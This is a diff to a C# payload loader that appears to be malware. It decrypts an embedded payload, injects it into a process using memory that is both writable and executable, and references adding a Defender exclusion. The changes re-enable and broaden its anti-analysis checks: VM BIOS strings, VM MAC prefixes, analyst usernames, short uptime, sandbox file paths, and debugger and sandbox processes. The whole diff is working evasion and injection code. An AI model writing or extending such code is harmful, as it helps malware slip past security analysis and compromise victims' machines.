@@ -5,6 +5,10 @@ using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Management;
 using System.Threading;
+using System.Net.NetworkInformation;
+using Microsoft.Win32;
+using System.Linq;
+
 
 class Program
 {
@@ -35,11 +39,11 @@ class Program
         {
             Console.WriteLine("[*] Starting program...");
 
-            // if (IsVirtualMachine())
-            // {
-            //     Console.WriteLine("[!] VM detected, exiting...");
-            //     return;
-            // }
+             if (IsVirtualMachine())
+             {
+                 Console.WriteLine("[!] VM detected, exiting...");
+                 return;
+             }
 
             byte[] encrypted = %%ENCRYPTED_BYTES%%;
             byte[] key = %%KEY_BYTES%%;
@@ -87,57 +91,145 @@ class Program
     }
 
     static bool IsVirtualMachine()
+ {
+    if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
+        return false;
+
+    // 1. Registry BIOS info
+    try
     {
-        if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
-            return false;
-
-        string[] vmIndicators = new[]
+        using var key = Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\BIOS");
+        if (key != null)
         {
-            Deobfuscate(new[] { 21, 12, 48, 26, 43, 30 }),
-            Deobfuscate(new[] { 21, 34, 43, 45, 46, 26, 37 }),
-            Deobfuscate(new[] { 21, 27, 40, 49 }),
-            Deobfuscate(new[] { 23, 30, 39 }),
-            Deobfuscate(new[] { 16, 4, 12, 20 }),
-            Deobfuscate(new[] { 12, 34, 28, 43, 40, 44, 40, 31, 45 }),
-            Deobfuscate(new[] { 7, 50, 41, 30, 43, 63, 21 }),
-            Deobfuscate(new[] { 0, 38, 26, 51, 40, 39 }),
-            Deobfuscate(new[] { 6, 40, 40, 32, 37, 30 })
-        };
+            string manufacturer = key.GetValue("SystemManufacturer")?.ToString() ?? "";
+            string productName = key.GetValue("SystemProductName")?.ToString() ?? "";
+            string biosVersion = key.GetValue("BIOSVersion")?.ToString() ?? "";
 
-        string biosInfo = "";
-        try
-        {
-            using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_BIOS"))
+            Console.WriteLine($"[BIOS] Manufacturer: {manufacturer}");
+            Console.WriteLine($"[BIOS] ProductName : {productName}");
+            Console.WriteLine($"[BIOS] BIOSVersion : {biosVersion}");
+
+            string combined = (manufacturer + productName + biosVersion).ToLower();
+
+            string[] vmIndicators = { "vmware", "virtualbox", "xen", "kvm", "qemu", "hyper-v", "vbox" };
+            foreach (string ind in vmIndicators)
             {
-                foreach (ManagementObject obj in searcher.Get())
+                if (combined.Contains(ind))
                 {
-                    biosInfo += obj["Manufacturer"]?.ToString() ?? "";
-                    biosInfo += obj["SMBIOSBIOSVersion"]?.ToString() ?? "";
-                    biosInfo += obj["Name"]?.ToString() ?? "";
-
-                    Console.WriteLine($"  Manufacturer: {obj["Manufacturer"]}");
-                    Console.WriteLine($"  Name: {obj["Name"]}");
-                    Console.WriteLine($"  Version: {obj["SMBIOSBIOSVersion"]}");
+                    Console.WriteLine($"[!] VM detected via BIOS info. Matched: {ind}");
+                    return true;
                 }
             }
         }
-        catch (Exception ex)
-        {
-            Console.WriteLine("[!] VM check exception: " + ex.Message);
-        }
+    }
+    catch (Exception ex)
+    {
+        Console.WriteLine($"[Error] BIOS info: {ex.Message}");
+    }
 
-        biosInfo = biosInfo.ToLower();
-        foreach (string indicator in vmIndicators)
+    // 2. MAC address
+    try
+    {
+        string[] vmMacs = new[]
         {
-            if (biosInfo.Contains(indicator.ToLower()))
+            "00:05:69", "00:0C:29", "00:1C:14", "00:50:56", // VMware
+            "08:00:27",                                     // VirtualBox
+            "52:54:00",                                     // QEMU/KVM
+        };
+
+        foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
+        {
+            var mac = string.Join(":", nic.GetPhysicalAddress().GetAddressBytes().Select(b => b.ToString("X2")));
+            Console.WriteLine($"[MAC] {mac} ({nic.Description})");
+            if (vmMacs.Any(vm => mac.StartsWith(vm)))
             {
-                Console.WriteLine("[!] Virtual Machine detected based on BIOS info: " + indicator);
+                Console.WriteLine($"[!] VM MAC detected: {mac}");
                 return true;
             }
         }
-
-        return false;
     }
+    catch (Exception ex)
+    {
+        Console.WriteLine($"[Error] MAC address check: {ex.Message}");
+    }
+
+    // 3. Suspicious usernames
+    string user = Environment.UserName.ToLower();
+    Console.WriteLine($"[User] Username: {user}");
+    if (new[] { "user", "test", "sandbox", "analyst", "maltest", "Abby", "Bruno", "george" }.Any(u => user.Contains(u)))
+    {
+        Console.WriteLine($"[!] Suspicious username: {user}");
+        return true;
+    }
+
+    // 4. Uptime check (sandbox often reboots quickly)
+    try
+    {
+        var uptime = TimeSpan.FromMilliseconds(Environment.TickCount64);
+        Console.WriteLine($"[Uptime] System uptime: {uptime.TotalMinutes:F2} minutes");
+        if (uptime.TotalMinutes < 5)
+        {
+            Console.WriteLine("[!] Very short system uptime");
+            return true;
+        }
+    }
+    catch (Exception ex)
+    {
+        Console.WriteLine($"[Error] Uptime: {ex.Message}");
+    }
+
+    // 5. Sandbox indicators (file paths)
+    string[] suspiciousPaths = new[]
+    {
+        @"C:\sample", @"C:\sandbox", @"C:\analysis", @"C:\automated", @"C:\Users\Sandbox",
+        @"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\agent.exe"
+    };
+
+    foreach (var path in suspiciousPaths)
+    {
+        if (File.Exists(path))
+        {
+            Console.WriteLine($"[!] Suspicious file exists: {path}");
+            return true;
+        }
+        else if (Directory.Exists(path))
+        {
+            Console.WriteLine($"[!] Suspicious directory exists: {path}");
+            return true;
+        }
+        else
+        {
+            Console.WriteLine($"[Check] Path not found: {path}");
+        }
+    }
+
+    // 6. Suspicious processes
+    try
+    {
+        string[] sandboxProcesses = new[]
+        {
+            "vmsrvc", "vmusrvc", "xenservice", "vboxservice", "vboxtray",
+            "wireshark", "procmon", "filemon", "regmon", "cuckoo", "fiddler", "ida", "ollydbg",
+            "anyrun", "virustotal", "joesandbox"
+        };
+
+        foreach (var proc in Process.GetProcesses())
+        {
+            string name = proc.ProcessName.ToLower();
+            if (sandboxProcesses.Any(s => name.Contains(s)))
+            {
+                Console.WriteLine($"[!] Sandbox-related process found: {name}");
+                return true;
+            }
+        }
+    }
+    catch (Exception ex)
+    {
+        Console.WriteLine($"[Error] Process scan: {ex.Message}");
+    }
+
+    return false;
+}
 
     static void AddDefenderExclusion(string exeName)
     {
@@ -232,7 +324,7 @@ class Program
         IntPtr len = (IntPtr)payload.Length;
         st = alloc(hProc, ref addr, IntPtr.Zero, ref len, 0x3000, 0x40);
         if (st != Win32.NTSTATUS.Success)
-            throw new Exception("xNtAllocateVirtualMemoryx failed");
+            throw new Exception($"xNtAllocateVirtualMemoryx failed, NTSTATUS=0x{((uint)st):X}");
 
         st = write(hProc, addr, payload, payload.Length, out _);
         if (st != Win32.NTSTATUS.Success)
